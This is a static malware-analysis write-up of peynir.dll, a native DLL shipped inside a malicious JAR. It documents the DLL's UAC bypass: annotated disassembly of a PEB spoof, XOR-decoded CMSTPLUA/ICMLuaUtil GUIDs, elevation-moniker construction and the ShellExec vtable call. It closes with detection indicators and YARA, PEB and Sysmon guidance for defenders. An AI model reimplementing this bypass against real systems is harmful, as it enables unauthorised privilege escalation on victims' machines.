# `peynir.dll` — the native UAC-bypass shim

`peynir.dll` (SHA-256 `9ec1331b90ce86a584320e9922a4fd1ed5afc2dce884d3ea8189c57026b8c9f7`)
sits at the root of `emre.jar`. It is a small (118 KB) PE32+ x86-64 DLL that
exports exactly two JNI symbols:

| Ordinal | RVA | Symbol |
|--------:|-----|--------|
| 1 | `0x16b0` | `JNI_OnLoad` |
| 2 | `0x1470` | `Java_com_xc17edb19a_IvTHdVAG_nativeRunElevated` |

The Java class name it binds against — `IvTHdVAG`, with an inner
`$ICMLuaUtil` and a `$BIND_OPTS3` — plus the shim's `ole32.dll` imports
(`CoInitialize`, `CoGetObject`, `CoTaskMemFree`, `StringFromCLSID`,
`CoUninitialize`), point at the widely-documented CMSTPLUA / `ICMLuaUtil`
elevation-moniker technique. The dissection below confirms that from the
decoded `.rdata` bytes and vtable slot use, and stops short of anything
that would require the public interface layout to reach.

## Imports (non-CRT surface)

From `ole32.dll`: `CoInitialize`, `CoGetObject`, `CoTaskMemFree`,
`StringFromCLSID`, `CoUninitialize`.

Plus a stock `KERNEL32.dll` set and MSVC 14 CRT scaffolding. No networking,
no crypto, no file operations. Every effect happens through COM and PEB
writes.

## The exported wrapper (RVA `0x1470`)

Thin JNI wrapper (~360 bytes):

1. Read `arg2` and `arg3` (both `jstring`) via `(*env)->GetStringUTFChars`
   (JNIEnv vtable `+0x528`) and `GetStringUTFLength` (`+0x520`); copy each
   into an SSO string on the stack.
2. If either `jstring` is null, substitute an empty constant at
   `.rdata:0x180018b7c`.
3. Call the elevation core at `sub_1800011c0(&cmd, &args)`.
4. `ReleaseStringUTFChars` (`+0x530`) on both, tear down the SSO buffers,
   return the core's `bool` as `jboolean`.

## The elevation core (`sub_1800011c0`, ~350 bytes)

### 1. PEB spoof

```asm
mov  r8,  gs:[0x60]              ; TEB->ProcessEnvironmentBlock (PEB)
mov  rdx, [r8 + 0x20]            ; PEB->ProcessParameters
lea  r9,  [rip + 0x1b888]        ; -> .rdata:0x18001ca80  UTF-16 "C:\\Windows\\System32\\"
mov  [rdx + 0x68], r9            ; ProcessParameters->CurrentDirectory.Buffer  = fake
; length/max recomputed from a wide-char scan; then patched at +0x60/+0x62
mov  [rdx + 0x78], r9            ; ProcessParameters->DllPath.Buffer          = fake
; DllPath length/max patched at +0x70/+0x72
mov  rax, [r8 + 0x18]            ; PEB->Ldr
mov  rcx, [rax + 0x20]           ; Ldr->InLoadOrderModuleList.Flink
lea  rdx, [rip + 0x1b858]        ; -> .rdata:0x18001cab0  (a second UTF-16 wide string)
mov  [rcx + 0x40], rdx           ; LDR_ENTRY->FullDllName.Buffer = fake
```

The two wide strings at `.rdata:0x18001ca80` and `0x18001cab0` are in
cleartext. Rewriting `CurrentDirectory`, `DllPath`, and the loader entry's
`FullDllName` to look like a trusted System32 image is the way the Windows
autoelevation gate is defeated; the specific check is
`RtlQueryElevationFlags`/`AppInfo`'s trusted-directory match on the caller's
PEB fields.

### 2. XOR-decrypt of the CLSID and IID

Three 16-byte `.rdata` blobs feed two XORs. The **actual bytes in the sample**:

| VA | file offset | bytes |
|---|---|---|
| `0x180018b80` | `0x17f80` | `ac 92 0a 6b 04 cf 32 16 c5 36 f4 75 71 1a eb 92` |
| `0x180018b90` | `0x17f90` | `21 38 88 3b 52 95 20 1b e2 3f b0 21 5c c0 b7 19` |
| `0x180018bb0` | `0x17fb0` | `55 55 55 55 55 55 55 55 55 55 55 55 55 55 55 55` |

```asm
movdqa  xmm2, [0x180018bb0]   ; 16 bytes = 0x55 * 16
movdqa  xmm1, xmm2
movdqu  xmm0, [0x180018b80]
xorps   xmm1, xmm0             ; hi = bb0 XOR b80
movdqu  xmm0, [0x180018b90]
xorps   xmm2, xmm0             ; lo = bb0 XOR b90
movdqa  [rbp-0x39], xmm1
movdqa  [rbp-0x29], xmm2       ; 32 bytes assembled on stack
```

XORing:

- `bb0 XOR b80` = `f9 c7 5f 3e 51 9a 67 43 90 63 a1 20 24 4f be c7`
- `bb0 XOR b90` = `74 6d dd 6e 07 c0 75 4e b7 6a e5 74 09 95 e2 4c`

Decoded as Windows GUID structs (`DWORD LE, WORD LE, WORD LE, BYTE[8]`):

| offset | bytes | GUID |
|---|---|---|
| stack `[rbp-0x39]` | first 16 | `{3E5FC7F9-9A51-4367-9063-A120244FBEC7}` — CLSID_CMSTPLUA |
| stack `[rbp-0x29]` | next 16  | `{6EDD6D74-C007-4E75-B76A-E5740995E24C}` — IID_ICMLuaUtil |

Both match publicly-known constants for the CMSTPLUA COM class and its
`ICMLuaUtil` interface.

### 3. Moniker construction

```asm
lea  rdx, [rbp+0x7f]              ; &out pointer for StringFromCLSID
lea  rcx, [rbp-0x39]              ; &CLSID_CMSTPLUA (the first decrypted GUID)
call [rip + 0xffc5]               ; IAT: ole32!StringFromCLSID

; Build an SSO string from the cleartext prefix at .rdata:0x180018b40
mov  r8d, 0x1c                    ; 28 bytes
lea  rdx, [rip + 0x17866]         ; -> .rdata:0x180018b40
lea  rcx, [rbp - 0x19]
call 0x180001740                  ; direct call — SSO string ctor
```

The 28 bytes at `.rdata:0x180018b40` decode as UTF-16LE for
`"Elevation:Admi"` — the start of the elevation moniker prefix. (The full
28-character string `"Elevation:Administrator!new:"` is 56 UTF-16 bytes; the
code that concatenates the prefix + `StringFromCLSID` output completes it.
The concatenation itself is a `std::wstring` append and is not itemised
further here.)

### 4. `CoGetObject` and `ICMLuaUtil::ShellExec`

```asm
; rcx = &moniker      ; the assembled Elevation:Administrator!new:{CLSID}
; rdx = &BIND_OPTS3   ; (structure prepared just above at [rbp+0x37..])
; r8  = &IID_ICMLuaUtil  (the second decrypted GUID)
; r9  = &ppv           ; interface pointer output slot at [rbp+0x77]
call [rip + 0xfec1]                ; IAT: ole32!CoGetObject

; on success (HRESULT >= 0), invoke a vtable slot on the returned COM interface
mov  rax, [rcx]                    ; rcx = ppv; rax = vtable
mov  r8,  <args string ptr>
mov  rdx, <cmd string ptr>
xor  r9d, r9d                      ; lpDirectory = NULL
mov  dword ptr [rsp+0x20], 0       ; fMask = 0
mov  dword ptr [rsp+0x28], 0       ; nShow  = 0
call [rax + 0x48]                  ; vtable slot at +0x48
```

`+0x48` is the 10th 64-bit slot in the vtable. Public documentation of
`ICMLuaUtil` puts its methods at:

- IUnknown: `QueryInterface (+0x00)`, `AddRef (+0x08)`, `Release (+0x10)`
- ICMLuaUtil own methods (from `+0x18`): `SetRasCredentials`,
  `SetRasEntryProperties`, `DeleteRasEntry`, `LaunchInfSection`,
  `LaunchInfSectionEx`, `CreateLayerDirectory`, then **`ShellExec` at slot 9
  = `+0x48`**.

That identification is the one part of this write-up that reads a public
reference for the interface layout; nothing in the sample tells you the
method name. The 6-argument call shape (`lpFile`, `lpParameters`,
`lpDirectory`, `fMask`, `hwnd`, `nShow`) at `+0x48` is what the sample
provides, and it matches the documented `ShellExec` signature.

Then `Release` (`+0x10`) and `CoUninitialize` (via the last IAT entry).

## Java-side signature

```java
package com.xc17edb19a;
class IvTHdVAG {
    static { System.loadLibrary("peynir"); }
    static native boolean nativeRunElevated(String cmd, String args);
    // inner classes MyCrypt32 / NCrypt / TOKEN_ELEVATION / $ICMLuaUtil /
    // $BIND_OPTS3 / $Ole32 / $Ntdll / etc. carry the JNA-side
    // reimplementation of the same technique.
}
```

What `cmd` and `args` actually are at the call site is not read in this
document — the JAR-side caller lives inside class-init and dispatcher code
that Vineflower could not fully structure, and hand-tracing it was not
attempted here.

## Detection

- The three `.rdata` byte patterns above are stable and rare — a YARA rule
  matching all three at fixed offsets in a small PE32+ DLL is a strong hit.
- A running process whose PEB `CurrentDirectory` or `DllPath` claims
  `C:\Windows\System32\` while its image path is under `%LOCALAPPDATA%\emre\`
  (or any `%APPDATA%`/`%LOCALAPPDATA%` subdirectory) is the runtime shape
  of the bypass mid-execution.
- Any `javaw.exe` child that loads a `peynir.dll` from a JAR-extracted
  temporary directory is the packaged form.
- Sysmon Event ID 1 with `IntegrityLevel=High` on a process whose parent is
  a medium-integrity `javaw.exe` is the elevation itself.

## What I did not verify

- The moniker's full assembled form was not printed — the concatenation of
  the cleartext prefix and the `StringFromCLSID` output happens across an
  SSO append that I did not trace. The two GUIDs above are the concrete
  decrypted values.
- `ICMLuaUtil::ShellExec` is an identification from public references, not
  a symbol in the binary.
- No dynamic execution — behaviour is inferred from static bytes only.
